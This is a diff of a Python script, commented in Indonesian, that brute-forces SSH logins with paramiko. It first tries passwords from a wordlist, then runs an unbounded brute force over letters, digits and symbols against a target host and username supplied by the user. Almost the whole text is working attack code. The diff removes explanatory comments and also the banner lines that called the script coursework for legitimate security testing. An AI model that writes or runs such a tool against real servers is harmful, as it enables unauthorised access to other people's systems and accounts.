@@ -7,18 +7,13 @@ import string
 def attempt_login(ssh_client, hostname, port, username, password, timeout):
     """Mencoba satu kali login SSH dan mengembalikan True jika berhasil."""
     try:
-        # Menghapus AutoAddPolicy agar tidak terus menambah host key yang tidak dikenal jika server sering ganti
-        # Namun untuk tujuan brute force, AutoAddPolicy membantu agar tidak perlu konfirmasi manual.
-        # Jika Anda sering menghadapi "Host key not found", mungkin ini alasannya.
-        # ssh_client.set_missing_host_key_policy(paramiko.RejectPolicy()) # Atau bisa pakai ini untuk keamanan yang lebih ketat
-        
         ssh_client.connect(hostname=hostname, port=port, username=username, password=password, timeout=timeout, auth_timeout=timeout)
         return True
     except paramiko.AuthenticationException:
         return False
     except paramiko.SSHException as e:
         print(f"Error SSH: {e}. Menjeda sebentar sebelum mencoba lagi...")
-        time.sleep(5) # Jeda jika ada masalah SSH (misal: rate limiting dari server)
+        time.sleep(5) 
         return False
     except paramiko.buffered_pipe.PipeTimeout:
         print(f"Koneksi timeout untuk '{password}'. Server mungkin memblokir atau terlalu lambat.")
@@ -28,7 +23,7 @@ def attempt_login(ssh_client, hostname, port, username, password, timeout):
         return False
     finally:
         # Pastikan klien SSH ditutup setelah setiap percobaan
-        if ssh_client: # Cek apakah ssh_client sudah diinisialisasi
+        if ssh_client: 
             ssh_client.close()
 
 
@@ -37,8 +32,7 @@ def run_brute_force_hybrid(hostname, port, username, password_list_file, timeout
     Melakukan serangan brute force hibrida: dictionary attack, lalu pure brute force.
     """
     ssh_client = paramiko.SSHClient()
-    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Izinkan koneksi ke host baru tanpa konfirmasi
-
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
     # --- Tahap 1: Dictionary Attack ---
     print("--------------------------------------------------")
     print("  Tahap 1: Memulai Dictionary Attack SSH")
@@ -55,7 +49,7 @@ def run_brute_force_hybrid(hostname, port, username, password_list_file, timeout
         print(f"Mencoba {len(dictionary_passwords)} kata sandi dari {password_list_file}...\n")
         for i, password in enumerate(dictionary_passwords):
             password = password.strip()
-            if not password: # Lewati baris kosong di wordlist
+            if not password: 
                 continue
 
             print(f"Mencoba (Dictionary): {password}")
@@ -65,7 +59,7 @@ def run_brute_force_hybrid(hostname, port, username, password_list_file, timeout
             
             # Re-initialize SSHClient for the next attempt if it was closed in attempt_login
             ssh_client = paramiko.SSHClient()
-            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Penting untuk setiap percobaan
+            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
 
         print("\n[SELESAI Tahap 1] Tidak ada kata sandi yang cocok ditemukan dalam daftar.")
     else:
@@ -74,14 +68,8 @@ def run_brute_force_hybrid(hostname, port, username, password_list_file, timeout
     # --- Tahap 2: Pure Brute Force (Tanpa Batas Panjang & Semua Simbol) ---
     print("\n--------------------------------------------------")
     print("  Tahap 2: Memulai Pure Brute Force SSH")
-    print("  Ini akan mencoba setiap kombinasi karakter, termasuk simbol.")
-    print("  **Tidak ada batasan panjang kata sandi.**")
-    print("  Tekan Ctrl+C untuk menghentikan kapan saja.")
     print("--------------------------------------------------\n")
 
-    # Karakter set untuk brute force murni: semua huruf kecil, huruf besar, angka, DAN SEMUA SIMBOL
-    # string.printable mencakup semua karakter ASCII yang dapat dicetak, termasuk spasi.
-    # Jika Anda tidak ingin spasi, gunakan: string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
     character_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
     
     # Menampilkan set karakter untuk konfirmasi
@@ -122,8 +110,6 @@ def run_brute_force_hybrid(hostname, port, username, password_list_file, timeout
 if __name__ == "__main__":
     print("--------------------------------------------------")
     print("  Skrip Brute Force SSH Hibrida")
-    print("  (Dictionary Attack + Pure Brute Force - Tanpa Batas Panjang & Semua Simbol)")
-    print("  Ini ditujukan untuk tugas kuliah dan pengujian keamanan yang sah.")
     print("--------------------------------------------------\n")
 
     target_hostname = input("Masukkan hostname atau IP server SSH target: ")
